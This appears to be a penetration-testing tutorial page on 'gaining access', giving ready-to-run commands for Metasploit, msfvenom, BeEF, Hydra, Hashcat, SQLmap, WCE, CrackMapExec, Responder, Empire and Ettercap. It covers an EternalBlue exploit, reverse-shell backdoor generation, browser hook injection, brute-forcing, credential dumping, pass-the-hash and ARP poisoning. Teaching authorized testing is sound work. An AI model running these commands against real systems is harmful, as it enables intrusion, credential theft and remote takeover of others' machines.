Phase 3

Gaining Access

Exploit vulnerabilities and gain initial access to target systems using these powerful penetration testing tools. This phase focuses on breaking into systems through various attack vectors.

Understanding Gaining Access

The gaining access phase involves actively exploiting vulnerabilities to establish a foothold in the target system. This can be achieved through various methods including exploitation frameworks, password attacks, and web application vulnerabilities.

Exploitation

Using known vulnerabilities to gain unauthorized access to systems.

Password Attacks

Cracking or bypassing authentication mechanisms.

Web Attacks

Exploiting web application vulnerabilities like SQLi, XSS.

Featured Tools

Metasploit Framework

A powerful exploitation framework used to test, validate, and exploit system vulnerabilities in ethical hacking scenarios.

Exploitation Payloads Open Source
How to Use Metasploit Framework 
msfconsole
🔹 Description

Metasploit Framework is an advanced, open-source platform for penetration testing. It allows ethical hackers to write, test, and execute exploits against remote systems with precision and automation.

🚀 Typical Workflow
  1. Launch Metasploit
    msfconsole
  2. Search for exploits
    search ms17_010
  3. Select module
    use exploit/windows/smb/ms17_010_eternalblue
  4. Set target IP
    set RHOST 192.168.1.10
  5. Choose payload
    set PAYLOAD windows/meterpreter/reverse_tcp
  6. Set local listener IP/port
    set LHOST 192.168.1.5
    set LPORT 4444
  7. Run the exploit
    exploit
📘 Key Commands & Terms
  • exploit — The method used to take advantage of a vulnerability
  • payload — Code that runs after exploitation (e.g., reverse shell)
  • sessions — Manage active Meterpreter or shell sessions
  • info — View details about an exploit or payload
  • set — Assign values to variables like RHOST, LHOST, etc.
⚠️ Important Notes
  • Use only on systems you are authorized to test.
  • Keep your modules up-to-date using msfupdate.
  • Metasploit can integrate with databases (PostgreSQL) for tracking scans and loot.
Hydra

A fast and flexible password cracker that supports numerous protocols for brute-force attacks on login services.

Password Cracking Brute Force Open Source
How to Use Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.10
🔹 Description

Hydra (also known as THC-Hydra) is a fast and flexible tool for performing dictionary-based brute-force attacks on login services. It supports many protocols including SSH, FTP, HTTP, SMB, and more.

🚀 Common Use Cases
  • FTP brute-force attack
    hydra -l admin -P /path/to/passwords.txt ftp://192.168.1.10
  • SSH brute-force attack
    hydra -L users.txt -P passwords.txt ssh://192.168.1.10
  • HTTP login form
    hydra -l admin -P rockyou.txt 192.168.1.10 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
📘 Explanation of Flags
  • -l — Single username to use
  • -L — File containing a list of usernames
  • -P — File containing password list
  • -s — Specify port (optional)
  • -V — Verbose output of each attempt
⚠️ Notes
  • Brute-force attacks can trigger account lockouts — use responsibly.
  • Make sure you have permission to test the target system.
  • Hydra does not support all protocols natively; check with hydra -U for full list.
John the Ripper

A fast password cracker designed to detect weak Unix and Windows passwords using dictionary and brute-force attacks.

Password Cracking Hash Cracker Open Source
How to Use John the Ripper
john /path/to/hashfile.txt
🔹 Description

John the Ripper is a widely used password cracking tool that supports a variety of hash types. It can be used with wordlists, rules, and brute-force techniques to crack local password files or custom hash dumps.

🚀 Common Use Cases
  • Basic cracking
    john hashes.txt
  • Use custom wordlist
    john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
  • Show cracked passwords
    john --show hashes.txt
  • Generate password hash (e.g. for testing)
    john --stdin --format=raw-md5
📘 Explanation of Flags
  • --wordlist — Use a specific wordlist for cracking
  • --rules — Apply transformation rules to wordlist entries
  • --show — Display already cracked hashes
  • --format — Specify the hash type manually if needed
⚠️ Notes
  • You may need to convert password files (e.g., from /etc/shadow) using unshadow.
  • Make sure to specify the correct hash format when needed (e.g., raw-md5, sha256crypt).
  • John supports both CPU and GPU cracking in its Jumbo version.

Armitage

A graphical cyber attack management tool for Metasploit that visualizes targets and recommends exploits for streamlined penetration testing.

GUI Metasploit Team Collaboration
How to Use Armitage
armitage
🔹 Description

Armitage is a Java-based GUI for the Metasploit Framework that makes it easier for teams to conduct network attacks. It allows drag-and-drop exploitation, multi-host targeting, and real-time session sharing.

🚀 Common Use Steps
  1. Start PostgreSQL and Metasploit services
    sudo systemctl start postgresql
    msfdb init
  2. Launch Armitage
    armitage
  3. Connect to the Metasploit database (default is 127.0.0.1:55553)
  4. Scan hosts or import targets
  5. Right-click targets to view exploits, payloads, and actions
  6. Exploit and manage sessions graphically
📘 Features
  • Visual network map and host discovery
  • Drag-and-drop exploitation with Metasploit modules
  • Post-exploitation automation (e.g., Meterpreter scripts)
  • Multi-user collaboration for red teams
⚠️ Notes
  • Armitage is deprecated but still functional in many Kali Linux versions.
  • Requires Metasploit and PostgreSQL to be properly set up beforehand.
  • For newer projects, consider Cobalt Strike (paid successor).
Hashcat

An advanced GPU-accelerated password recovery tool supporting hundreds of hash types for fast and flexible cracking.

Password Cracking GPU Acceleration Open Source
How to Use Hashcat
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
🔹 Description

Hashcat is a powerful password recovery tool that supports GPU acceleration and a wide range of hashing algorithms. It is known for its high speed and flexibility in cracking hashes using various attack modes.

🚀 Common Use Cases
  • Basic dictionary attack (MD5)
    hashcat -m 0 -a 0 hashes.txt rockyou.txt
  • SHA1 hashes with wordlist
    hashcat -m 100 -a 0 hashes.txt passwords.txt
  • Brute-force attack
    hashcat -m 0 -a 3 hashes.txt ?a?a?a?a
  • Resuming paused session
    hashcat --restore
📘 Explanation of Flags
  • -m — Hash mode (0 = MD5, 100 = SHA1, 1800 = SHA512crypt, etc.)
  • -a — Attack mode (0 = dictionary, 3 = brute-force, 6 = hybrid)
  • --show — Show cracked hashes
  • --status — Display progress and status
  • --restore — Resume from last session
⚠️ Notes
  • Make sure your hash list is clean (one hash per line, no colons unless format requires).
  • Hashcat works best with compatible GPUs (NVIDIA/AMD).
  • Always use ethically, on authorized targets only.
  • To see all supported hash types, run hashcat -h.
BeEF

The Browser Exploitation Framework (BeEF) is a powerful tool for targeting web browsers via client-side attack vectors.

Browser Client-Side Open Source
How to Use BeEF (Browser Exploitation Framework)
beef-xss
🔹 Description

BeEF is a powerful penetration testing tool that focuses on client-side web browser exploitation. It allows attackers to hook a browser using a JavaScript payload and then control it to perform various post-exploitation modules.

🚀 Common Use Steps
  1. Start BeEF
    beef-xss
  2. Open the web interface
    http://127.0.0.1:3000/ui/panel
  3. Login
    Default credentials beef / beef
  4. Inject the hook script into a target page
    <script src="http://[your-ip]:3000/hook.js"></script>
  5. Wait for victims to load the page and get hooked
  6. Launch browser modules (e.g., alert popups, keyloggers, port scanning)
📘 Features
  • Works with Chrome, Firefox, Edge, Safari, etc.
  • Supports social engineering, persistence, browser fingerprinting
  • Modules include clickjacking, proxy injection, and XHR-based attacks
⚠️ Notes
  • BeEF is for ethical use only. You must have permission to test any system.
  • Modern browsers may flag or block hook scripts depending on protections (e.g. CSP, extensions)
  • Run on Kali Linux or systems with Ruby and required dependencies.
Medusa

A speedy, parallel, and modular login brute-forcer for remote authentication services like SSH, FTP, HTTP, and more.

Brute Force Login Cracker Open Source
How to Use Medusa
medusa -h 192.168.1.10 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh
🔹 Description

Medusa is a speedy parallel login brute-forcer that supports numerous protocols. It's ideal for testing large numbers of hosts or accounts in short time frames using customizable login modules.

🚀 Common Use Cases
  • Brute-force SSH login
    medusa -h 192.168.1.10 -u root -P passwords.txt -M ssh
  • FTP login cracking
    medusa -h 192.168.1.10 -U users.txt -P passwords.txt -M ftp
  • HTTP basic auth attack
    medusa -h 192.168.1.10 -u admin -P passwords.txt -M http -m DIR:/admin
📘 Explanation of Flags
  • -h — Target host IP
  • -u / -U — Single user or username list
  • -P — Password list file
  • -M — Module (e.g., ssh, ftp, telnet, http)
  • -m — Module options (e.g., directory for HTTP)
⚠️ Notes
  • Medusa supports parallel host/user/password testing, making it efficient but potentially loud on networks.
  • Always use on networks you have explicit authorization to test.
  • To see all supported modules medusa -d
SQLmap

An automated tool for detecting and exploiting SQL injection vulnerabilities in web applications with full DB takeover support.

SQL Injection Database Exploitation Open Source
How to Use SQLmap
sqlmap -u http://target.com/page.php?id=1 --dbs
🔹 Description

SQLmap is a powerful tool that automates the process of finding and exploiting SQL injection flaws. It supports a wide range of databases and can perform full database takeover when vulnerabilities exist.

🚀 Common Use Cases
  • List databases from vulnerable parameter
    sqlmap -u http://target.com/page.php?id=1 --dbs
  • Dump table contents
    sqlmap -u http://target.com/page.php?id=1 -D testdb -T users --dump
  • Identify DBMS and version
    sqlmap -u http://target.com/page.php?id=1 --banner
  • Bypass login forms
    sqlmap -u http://target.com/login.php --data "user=admin&pass=123" --dbs
📘 Explanation of Flags
  • -u — Target URL with vulnerable parameter
  • --dbs — List available databases
  • --tables — List tables in a selected database
  • --dump — Extract records from a table
  • --risk — Set risk level of payloads (1–3)
  • --level — Set testing level (1–5 for depth of testing)
⚠️ Notes
  • Ensure you have permission to test any web application.
  • Use --proxy or --tor to anonymize your traffic.
  • SQLmap supports GET and POST parameters, and even HTTP headers.
WCE

A post-exploitation tool for dumping Windows credentials from memory and performing pass-the-hash attacks on compromised machines.

Post-Exploitation Credential Dumping Windows
How to Use Windows Credential Editor (WCE)
wce.exe -w
🔹 Description

Windows Credential Editor (WCE) is a post-exploitation tool for extracting plaintext passwords, LM/NTLM hashes, and Kerberos tickets from memory on Windows systems. It is widely used for privilege escalation and lateral movement using pass-the-hash techniques.

🚀 Common Use Cases
  • Dump credentials from memory
    wce.exe -w
  • Perform pass-the-hash (PTH)
    wce.exe -s -u <user> -d <domain> -h <NTLM_hash>
  • List Kerberos tickets
    wce.exe -k
📘 Explanation of Flags
  • -w — Display user credentials (plaintext, hashes)
  • -s — Spawn a process with a spoofed token (for pass-the-hash)
  • -u — Username
  • -d — Domain name
  • -h — NTLM hash of the password
  • -k — Display Kerberos tickets
⚠️ Notes
  • WCE works on Windows XP through Windows 7. Later versions may block execution due to security enhancements.
  • This tool requires administrative privileges to access memory space.
  • Use it only in controlled environments and with explicit permission.
CrackMapExec

A Swiss Army knife for pentesters working with Active Directory networks. Supports SMB, RDP, WinRM, and more.

Post-Exploitation Active Directory Open Source
How to Use CrackMapExec
cme smb 192.168.1.0/24 -u administrator -p password
🔹 Description

CrackMapExec (CME) is a powerful post-exploitation and credential validation tool that targets Active Directory environments. It allows for credential spraying, command execution, enumeration, and lateral movement.

🚀 Common Use Cases
  • Validate SMB credentials on a subnet
    cme smb 192.168.1.0/24 -u user -p pass
  • Execute command on remote host
    cme smb 192.168.1.100 -u admin -p pass --exec 'ipconfig'
  • Pass-the-hash attack
    cme smb 192.168.1.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee:HASH
  • Enumerate shares
    cme smb 192.168.1.0/24 -u user -p pass --shares
📘 Explanation of Flags
  • smb — Protocol module (other options: winrm, rdp, etc.)
  • -u — Username
  • -p — Password
  • -H — NTLM hash for pass-the-hash
  • --exec — Remote command execution
  • --shares — Enumerate shared folders
⚠️ Notes
  • CME is ideal for blue team simulation and red team lateral movement.
  • Supports various modules beyond SMB (WinRM, MSSQL, etc.).
  • Use in authorized environments only. Misuse can be detected by endpoint security tools.
Responder

A powerful LLMNR/NBT-NS/MDNS poisoner used to capture hashes and credentials on Windows-based networks.

Poisoning Hash Capture Open Source
How to Use Responder
responder -I eth0
🔹 Description

Responder is a LLMNR, NBT-NS, and MDNS poisoner designed to capture Windows credentials and hashes on local networks. It's commonly used in internal network assessments for hash collection and relay attacks.

🚀 Common Use Cases
  • Start Responder on default interface
    responder -I eth0
  • Enable verbose output
    responder -I eth0 -v
  • Disable specific protocols (e.g., SMB)
    responder -I eth0 -v -d
  • Check logs and captured hashes
    cd /usr/share/responder/logs
📘 Explanation of Flags
  • -I — Specify the network interface to listen on
  • -v — Enable verbose logging
  • -f — Force NTLM authentication on SMB
  • -r — Respond to NetBIOS queries
  • -d — Disable SMB server
⚠️ Notes
  • Responder is extremely powerful and noisy. Use in controlled environments only.
  • Captured hashes can be cracked offline using tools like Hashcat or John the Ripper.
  • Requires root privileges to run effectively on most interfaces.
Ncrack

A high-speed network authentication cracking tool designed for large-scale audits of multiple services like SSH, RDP, FTP, and more.

Brute Force Multi-Protocol Open Source
How to Use Ncrack
ncrack -p ssh 192.168.1.10 -u root -P /usr/share/wordlists/rockyou.txt
🔹 Description

Ncrack is a fast, reliable network authentication cracking tool designed for security testing of high-speed networks. It supports multiple protocols including SSH, RDP, FTP, HTTP(S), VNC, Telnet, and more.

🚀 Common Use Cases
  • SSH login cracking
    ncrack -p ssh 192.168.1.10 -u admin -P rockyou.txt
  • FTP brute-force
    ncrack -p ftp 192.168.1.10 -U users.txt -P passwords.txt
  • RDP attack (Windows)
    ncrack -p rdp 192.168.1.5 -u administrator -P rdp_pass.txt
  • Multiple protocols on multiple hosts
    ncrack -p ssh,ftp 192.168.1.10,192.168.1.11 -U users.txt -P passwords.txt
📘 Explanation of Flags
  • -p — Protocol/port (e.g. ssh, ftp, rdp)
  • -u — Username
  • -U — Username file
  • -P — Password file
  • -g — Set protocol-specific options
  • -T — Timing template (controls speed)
⚠️ Notes
  • Always use Ncrack for ethical testing within authorized environments.
  • Consider adjusting timing (-T) for stealth or speed depending on the test scope.
  • Ncrack is developed by the same team behind Nmap — it's highly reliable and scriptable.
Empire

A post-exploitation framework that uses PowerShell and Python agents to maintain control, extract data, and perform lateral movement.

Post-Exploitation Agent-Based Command & Control
How to Use Empire
sudo ./empire
🔹 Description

Empire is a powerful post-exploitation and adversary emulation framework that supports PowerShell and Python-based agents. It is commonly used for persistence, privilege escalation, credential dumping, and lateral movement in Red Team operations.

🚀 Common Use Cases
  • Start the Empire server
    sudo ./empire
  • List listeners
    listeners
  • Create a listener
    uselistener http
  • Generate an agent (stager)
    usestager windows/launcher_bat
  • Interact with an agent
    interact [agent-name]
📘 Key Features
  • Agent-based control and communication
  • Module system for keylogging, persistence, and file exfiltration
  • Integrated obfuscation and encryption
  • HTTP(S), named pipes, and other C2 transport methods
⚠️ Notes
  • Empire is extremely powerful—always use in isolated labs or with legal authorization.
  • You may need to install additional dependencies like Flask, Python 3.8+, and PostgreSQL.
  • Useful for Red Teams and adversary simulation frameworks.
Msfvenom

A payload generator and encoder that combines msfpayload and msfencode. Used to craft custom backdoors and test antivirus evasion.

Payload Exploit Creation Metasploit
How to Use Msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe
🔹 Description

Msfvenom is a tool from the Metasploit Framework used to generate and encode payloads in various formats (EXE, APK, Python, etc.). It supports custom options like IP, port, bad characters, and output types for crafting malware or test payloads.

🚀 Common Use Cases
  • Create a Windows reverse shell
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe
  • Generate a raw Linux payload
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=5555 -f elf > shell.elf
  • Android APK backdoor
    msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 R > app.apk
  • Python-encoded payload for obfuscation
    msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.5 LPORT=7777 -f raw
📘 Explanation of Flags
  • -p — Specify payload (e.g., reverse_tcp, bind_shell)
  • LHOST — Local IP to receive reverse connection
  • LPORT — Listening port on attacker's machine
  • -f — Output format (exe, elf, apk, raw, c, etc.)
  • -e — Encoder (optional for evasion)
⚠️ Notes
  • Use msfconsole to set up a listener (exploit/multi/handler).
  • Payloads may be detected by antivirus unless obfuscated or encoded.
  • Only use with proper authorization and for security testing.
Ettercap

A comprehensive suite for man-in-the-middle attacks on LAN. Supports sniffing, ARP poisoning, and real-time connection manipulation.

MITM Sniffing LAN Attacks
How to Use Ettercap
ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.10/
🔹 Description

Ettercap is a powerful tool for network traffic interception and manipulation. It can be used to launch ARP poisoning, sniff credentials, and hijack live sessions on local area networks (LAN).

🚀 Common Use Cases
  • ARP poisoning between two hosts
    ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.10/
  • Sniff traffic on the whole subnet
    ettercap -T -q -i eth0 -M arp:remote //
  • Use graphical interface
    ettercap -G
📘 Explanation of Flags
  • -T — Text mode (no GUI)
  • -M — Man-in-the-middle attack mode (e.g. arp:remote)
  • -q — Quiet mode (minimal output)
  • -i — Specify network interface
  • // — Target entire network
⚠️ Notes
  • Ettercap requires root privileges.
  • ARP spoofing may trigger IDS/IPS or get blocked on managed networks.
  • Use responsibly and only in controlled or authorized environments.
